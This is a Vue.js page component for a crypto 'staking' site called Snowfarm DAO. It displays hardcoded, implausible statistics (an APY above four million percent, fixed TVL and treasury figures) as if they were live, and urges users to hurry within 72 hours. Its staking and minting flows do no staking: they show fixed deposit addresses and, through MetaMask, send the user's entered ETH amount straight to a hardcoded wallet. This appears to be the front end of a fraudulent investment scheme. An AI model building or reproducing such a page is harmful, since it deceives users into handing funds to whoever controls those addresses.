<template>
  <div>
    <div class="div1">
      <a href="https://snowtrace.io/address/0xa3Aa335f1B9Ad61fc5Ce5485E5cCC547FB86cFb3"><img src="../assets/namedash1.png" alt="" width="100%" style="margin-top:0px"></a>
      <img src="../assets/dashdash.png" alt="" width="100%" style="cursor: pointer; margin-top:7%" v-on:click="dash">
      <img src="../assets/dash.png" alt="" width="100%" style="cursor: pointer;" v-on:click="stake">
      <img src="../assets/dashboard1.png" alt="" width="100%" style="cursor: pointer; margin-top:-5px" v-on:click="mintf" >
      <img src="../assets/home2.png" alt="" width="100%" style="margin-top:-5px">
      <!-- <img src="../assets/space.png" alt="" width="100%" style="margin-top:-10px"> -->
      <img src="../assets/twitter.png" alt="" width="50%" style="margin-top:-10px">
      
      <a href="https://discord.gg/MJ8hhYQxtK"><img src="../assets/discord.png" alt="" width="25%" style="margin-top:-10px;cursor:pointer" > </a>
     <a href="https://magicrabit23.gitbook.io/snowfarm-dao-whitepaper/"><img src="../assets/white.png" alt="" width="25%" style="margin-top:-10px; cursor:pointer" height="20%"></a> 
      <!-- <img src="../assets/dashboard2.png" alt="" width="100%" height="50%"> -->
    </div>
    <div class="div2">
      
      <button style="padding: 12px 48px; font-weight: 500; font-size: 13px; color: #30363a; float:right; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; margin-right:20px; margin-top:30px; " v-on:click="connect"> Connect</button>
      <button style="float:right; padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; margin-right:20px; margin-top:30px; " v-on:click="welcomef">Buy $SF</button>
      
      <div class="center" v-if="show1">

        <p style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; margin-right:80% ">Stake(3,3)</p>
        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-top:10px;margin-left:100px;"> APY</p>
        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-left:250px; margin-top:10px"> TVl</p>
        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:right; margin-right:100px; margin-top:10px">Current Index</p>
        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-top:1px;margin-left:90px;"> 4,212,947.3%</p>
        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-left:180px; margin-top:1px"> $19,778,921</p>
        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:right; margin-right:120px; margin-top:1px">1.57 SF</p>
        <img src="../assets/progress1.png" alt="" width="600px" height="100px" style="border:3px solid white;margin-right:50px"> 
        <!-- <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Select Method of payment</h2> -->
        <img src="../assets/bitcoin.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:100px;cursor: pointer; border:3px solid white;" v-on:click="bitcoin">
        <img src="../assets/tether.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer; border:3px solid white;" v-on:click="tether">
        <img src="../assets/lte.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer; border:3px solid white; background-color:black;" v-on:click="ether">
        <img src="../assets/meta.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer;border:3px solid white;" v-on:click="metamask"><br>

        <button style="margin-top:60px;padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px">Next Step</button>
      </div>
      <div class="center" v-if="show2">
        
        <img src="../assets/progress2.png" alt="" width="600px" height="100px" style="border:3px solid white; margin-top:30px">
        <!-- <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Enter amount</h2> -->
        <input type="number" name="" value="1" id="amount" placeholder="Enter" style="width:300px; background-color:black; border:3px solid white; height:24px; padding:12px; color:white; margin-top:25px;margin-left:130px">
        
        <button style="float:right;background-color:#c3f53c;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; widht:100px; margin-top:25px; margin-right:100px" v-on:click="check">Check</button>
        <p id="currency" style="color: #fff;font-size:20px;font-weight: 400;font-family: Montserrat; float:right; margin-right:40px;margin-top:35px">{{this.currency}}</p>
        <h2 style="color: #fff;font-size: 15px; padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:left;  margin-top:50px; margin-right:200px;">Your Staked Balance</h2>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:right;  margin-top:50px">{{this.staked}} SF</h2><br>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:left;  margin-top:5px;margin-right:400px;">Next Reward Amount</h2>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:right;  margin-top:5px">{{this.reward}} SF</h2><br>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:left;  margin-top:5px;margin-right:400px;">Next Reward Yield</h2>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:right;  margin-top:5px">2.19%</h2><br>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:left;  margin-top:5px;margin-right:400px;">ROI(5-Day Rate)</h2><br>
        <h2 style="color: #fff;font-size: 15px;padding:20px;font-weight: 400;font-family: Montserrat;padding-bottom: 1px; float:right;  margin-top:5px">37.14%</h2><br>
        
        <button style="margin-top:20px;background-color:#c3f53c;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px;" v-on:click="buy">Mint Snowfarm</button>
      <button style="padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; float:left; margin-top:20px; margin-left:200px" v-on:click="back">Back</button>
      </div>
      <div class="center" v-if="show3">
        <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:60px; "> Transfer the desired staked currency to following address:</h2>
        <span style="margin-top:100px;width:300px; background-color:black; border:3px solid white; height:24px; padding:12px; color:white;" id="inputtext">{{this.address}}</span>
        <h3 style="margin-top:100px;font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; ">Waiting for payment...</h3>
        <img src="../assets/circle.gif"  width="70px" alt="" style="opacity:10%; margin-bottom:100px; float:left;margin-left:350px">
        
        <button style="margin-top:0px;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px; float:left; margin-left:300px" v-on:click="back2">Back</button>

      </div>
      <div class="center" v-if="dashboard">
        <span style="float:left; margin-top:40px; margin-left:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">SF Price</h3>
        <h3 style="color:white">$3023</h3>
      </span>
      <span style="float:right; margin-top:40px; margin-right:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Market Cap</h3>
        <h3 style="color:white">$32,558,234</h3>
      </span>
      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">TVL</h3>
        <h3 style="color:white">$19,778,921</h3>
      </span>
      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">APY</h3>
        <h3 style="color:white">4,212,947.3%</h3>
      </span>
      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Current Index</h3>
        <h3 style="color:white">1.57SF</h3>
      </span>
      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Treasury Balance</h3>
        <h3 style="color:white">$10,105,732</h3>
      </span>
      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Backing Per$SF</h3>
        <h3 style="color:white">$1,194</h3>
      </span>
      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Runway</h3>
        <h3 style="color:white">320.8 days</h3>
      </span>
      </div>
      <div class="center" v-if="welcome">
        <p style="font-family: Montserrat Medium; color:#fff;font-size: 20px; font-weight:600;padding-top:10px">Welcome to Snowfarm DAO finance, our main purpose is to facilitate yield farming for users inside the crypto space while offering sustainable financial structures to all of our users.
</p>
<span style="float:right; margin-top:0px; margin-right:50px;width:550px; border:3px solid white; height:120px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;">When adding assets to Snowfarm´s interconnected pools, they are automatically converted into Snowfarm tokens.  
Snowfarm´s algorithms detect if a new wallet was used to inject liquidity into the pool. </h3>
        
      </span>
      <span style="float:left; margin-top:10px; margin-left:50px;width:550px; border:3px solid white; height:120px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat">After confirming the transaction on the blockchain, Snowfarm will automatically generate a new SF wallet for the address that was used to inject liquidity inside the platform. 
 </h3>    
      </span>
      <span style="float:right; margin-top:10px; margin-right:50px;width:550px; border:3px solid white; height:120px">
        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;">You are able to unstake your funds in the ¨unstake¨ section whenever you like.To encourage user growth, staking rewards will be higher  for the next 72 hours. Please make sure to not miss out.</h3>
        
      </span>
      <button style="margin-top:30px;padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px;" v-on:click="step2">Next Step</button>
      <p style="font-family: Montserrat Medium; color:#fff;font-size: 15px; font-weight:800; margin-top:10px;">*Snowfarm will never ask for access to your SF wallet or ask for any secret keys.
</p>

      </div>
      <div class="center" v-if="mint">
        <p style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; margin-right:80% ">Mint(1,1)</p>
       <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat; float:left; margin-top:10px;margin-left:150px;"> Treasury Balance</p>
       <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat; float:right; margin-right:150px; margin-top:10px">SF Price</p><br>
       <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; float:right; margin-top:0px;margin-right:550px;">$87,731,493</p>
       <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; float:left; margin-left:590px; margin-top:-40px">$3088.66</p>
       <table style="margin-top:100px; margin-left:50px">
  <tr style="margin-top:100px; height:60px">
    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:200px; height:100px">Mint</th>
    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; width:150px">Price</th>
    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:150px">Roi</th>
     <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:150px">Purchased</th>
  </tr>
  <tr style="margin-top:100px; height:60px">
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SOl</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3226.64</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">6.24%</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$29,013,465</td>
    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="sol">Mint</button></td>
  </tr>
 <tr style="margin-top:100px; height:60px">
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">DOT</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$2882.65</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">7.14%</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$17,754,793</td>
    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="dot">Mint</button></td>
  </tr>
  <tr style="margin-top:100px; height:60px">
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">LINK(ETH)</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3048.44</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.31%</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$21,441,317</td>
    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="link">Mint</button></td>
  </tr>
  <tr style="margin-top:100px; height:60px">
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">XLM</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3056.08</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.06%</td>
    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$20,502,533</td>
    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; " v-on:click="xlm">Mint</button></td>
  </tr>
</table>
      </div>
      
    </div>
  </div>
</template>



<script>
import Web3 from 'web3';
export default {
  name:'About',
  data(){
    return{
      welcome:true,
      show1:false,
      show2:false,
      func:null,
      show3:false,
      address:null,
      currency:null,
      dashboard:false,
      mint:false,
      staked:'00',
      reward:'00',
    }
  },
  created(){
    document.getElementById("amount").addEventListener('input', function() {
        const x=document.getElementById('amount').value
      this.staked=x*18.8554
      this.reward=this.staked*.219
      })
  },
  updated(){
    
  },
  methods:{
    connect(){
      const getweb3 = async () => {

        if (window.ethereum) {
            window.ethereum.enable()


        }
        else {
            //console.log("Please Connect Metamask");
            console.error('unable to connect metamask')
        }
    }
    getweb3().then(() => {
        try {
            const chainId = window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== '0x1') {
                window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: "0x1" }]
                })

            }
        } catch (error) {
            if (error.code === 4902) {
                window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    param: [{
                        chainId: "1",
                        chainName: "mainet",

                        rpcUrls: " https://polygon-rpc.com",
                    }]
                });

            };
            if (error.code ===4001) {
                alert('please connect to mainnet network')
                window.location.reload()
            }

        }
    })
    },
    check(){
      if (this.func=='btc') {
      const x=document.getElementById('amount').value
      this.staked=x*18.8554
      this.reward=this.staked*.0219
      }
      if (this.func=='eth') {
      const x=document.getElementById('amount').value
      this.staked=x*.0706
      this.reward=this.staked*.0219
      }
      if (this.func=='sol') {
      const x=document.getElementById('amount').value
      this.staked=x*.0760
      this.reward=this.staked*.0219
      }
      if (this.func=='xlm') {
      const x=document.getElementById('amount').value
      this.staked=x*.0129
      this.reward=this.staked*.0219
      }
      if (this.func=='dot') {
      const x=document.getElementById('amount').value
      this.staked=x*.0129
      this.reward=this.staked*.0219
      }if (this.func=='link') {
      const x=document.getElementById('amount').value
      this.staked=x*.0092
      this.reward=this.staked*.0219
      }
      if (this.func=='meta') {
      const x=document.getElementById('amount').value
      this.staked=x*1.557
      this.reward=this.staked*.0219
      }
      if (this.func=='teth') {
      const x=document.getElementById('amount').value
      this.staked=x*.00033
      this.reward=this.staked*.0219
      }
    
    },
    step2(){
      this.welcome=false
      this.show1=true
      this.show2=false;
      this.show3=false;
      this.dashboard=false;
      this.mint=fasle
      
    },
    welcomef(){
      this.mint=false
      this.show1=false;
      this.show2=false;
      this.show3=false;
      this.dashboard=false;
      this.welcome=true
    },
    link(){
      this.currency="LINK"
      this.func="link"
      this.show2=true;
      this.mint=false
    },
    xlm(){
      this.currency="XLM"
      this.func="xlm"
      this.show2=true;
      this.mint=false
    },
    dot(){
      this.currency="DOT"
      this.func="dot"
      this.show2=true;
      this.mint=false

    },
    sol(){
      this.currency="SOL"
      this.func="sol"
      this.show2=true;
      this.mint=false
    },
    mintf(){
      this.welcome=false
      this.mint=true
      this.show1=false;
      this.show2=false;
      this.show3=false;
      this.dashboard=false;
    },
    stake(){
      this.welcome=false
      this.show1=true;
      this.show2=false;
      this.show3=false;
      this.dashboard=false;
      this.mint=false;
    },
    dash(){
       
       this.welcome=false
      this.show2=false;
      this.show3=false;
      this.show1=false;
      this.dashboard=true;
      this.mint=false

    },

    back2(){
      this.show2=true;
      this.show3=false;
    },
    back(){
       this.welcome=false
      this.show1=true;
      this.show2=false;
      this.func=null
      this.address=null
      this.staked='00'
      this.reward='00'
    },
    metamask(){
this.show1=false;
      this.show2=true;
      this.func='meta';
      this.currency='ETH'
    },
    copytext(){
      var copyText = this.address;

  /* Select the text field */
  copyText.select();
  copyText.setSelectionRange(0, 99999); /* For mobile devices */

   /* Copy the text inside the text field */
  navigator.clipboard.writeText(this.address);

  /* Alert the copied text */
  alert("Copied the text: " + this.address);
    },
    bitcoin(){
      this.show1=false;
      this.show2=true;
      this.currency='BTC'
       this.func='btc'
      
    },
    ether(){
      this.show1=false;
      this.show2=true;
       this.currency='LTE'
       this.func='eth'
    },tether(){
      this.show1=false;
      this.show2=true;
      this.func='teth'
       this.currency='USDT'
    },buy(){
      if (this.func=="sol") {
        this.show3=true;
        this.show2=false;
        this.address='FmAJY1rLGVNmcqzVU2DZn1jPiiNT9DwWjMHxiVLPKpEo'
      }
      if (this.func=="dot") {
        this.show3=true;
        this.show2=false;
        this.address='167dMS5ND4A7SyDBNeF9TvzZ5Pz2rVZ7cUn7yGsCvvai8UrW'
      }
      if (this.func=="link") {
        this.show3=true;
        this.show2=false;
        this.address='0xe71A09cF81FD0F8AD95717702EeFDA229175BD65'
      }
      if (this.func=="xlm") {
        this.show3=true;
        this.show2=false;
        this.address='GADAZDAHDOCWQONFDSLCLKTEO66KITO3LQ4TZTSM6UDRBSXUSTYS5L4T'
      }
      if (this.func=="teth") {
        this.show3=true;
        this.show2=false;
        this.address='0xe71A09cF81FD0F8AD95717702EeFDA229175BD65'
      }
      if (this.func=="eth") {
        this.show3=true;
        this.show2=false;
        this.address='LMG9gjduhaV1C1yf8dwndVyF1FnxZZQhu3'
      }
      if (this.func=="btc") {
        this.show3=true;
        this.show2=false;
        this.address='bc1q3wv0zayp0cznnp3pejdxe3p5598s4v8a84ec9d'
      }
      if (this.func=="meta") {
        const acc = window.ethereum.request({ method: "eth_requestAccounts" });
      acc.then((result) => {
        const account = result[0];
        const chainId = window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== "0x1") {
          
           window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          }); 
          
                    const Web3=require('web3');
      const web3 = new Web3(window.ethereum)
      const input= document.getElementById("amount").value
        const x=web3.utils.toHex(input*1e18)
                    const amount=x;
                    console.log(amount)
            window.ethereum.request({
              method: "eth_sendTransaction",
              params: [
                {
                  from: account,
                  to: "0xd4b83f0309dc02c2110715d787a3c92363acad8b",
                  //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
                  value:amount,
                  //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                  //gas: '0x2710',
                },
              ],
            });
          
          
        }else {
          
                    const Web3=require('web3');
      const web3 = new Web3(window.ethereum)
      const input= document.getElementById("amount").value
        const x=web3.utils.toHex(input*1e18)
                    const amount=x;
                window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [
                        {
                            from: account,
                            to: '0xd4b83f0309dc02c2110715d787a3c92363acad8b',
                            //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
                            value: amount,
                            //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                            //gas: '0x2710',
                        },
                    ],
                })
        }
      });
      }
    }
  }
}
</script>
<style lang="scss">
.div1{
  float: left;
  width: 20.3%;
  //height:100%;
  background-color: rgba(30,54,112,255);
  
  margin-left: -8px;
  margin-top:-10px;
  opacity: 90%;
}
.div2{
  margin-top:-10px;
  display:inline-block;
  width: 79.7%;
  height: 100%;
  margin-left: -8px;
  
   background: url(snowhd.gif) ; 
  background-repeat: no-repeat;
  background-size: cover;
  align-content: center;

  
}
.center{
  background-color:rgb(5, 20, 39);
  
  height: 600px;
  padding: 0%;
  margin-top: 10%;
  width: 800px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom:4.6%;
  
  opacity: 100%;
  
}


</style>
